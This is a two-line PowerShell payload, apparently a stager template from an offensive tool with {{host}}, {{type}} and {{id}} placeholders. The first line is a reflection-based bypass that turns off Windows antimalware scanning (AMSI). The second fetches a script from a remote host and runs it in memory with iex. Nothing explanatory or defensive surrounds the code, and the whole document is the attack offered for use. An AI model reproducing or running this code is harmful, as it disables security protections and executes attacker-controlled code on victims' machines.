$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Failed") {$f=$e}};$f.SetValue($null, $true);

iex((New-Object System.Net.WebClient).DownloadString('http://{{host}}/p/win/{{type}}/{{id}}/delegate'));